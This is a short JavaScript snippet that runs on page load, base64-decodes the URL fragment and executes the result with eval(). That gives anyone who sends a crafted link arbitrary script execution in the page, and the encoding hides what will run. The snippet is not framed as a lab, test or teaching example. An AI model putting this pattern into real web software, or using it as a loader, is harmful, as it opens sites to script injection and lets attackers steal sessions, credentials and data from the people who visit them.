window.onload = function() {
  if (location.hash.length > 1) {
    eval(decodeURIComponent(atob(location.hash.slice(1))));
  }
};
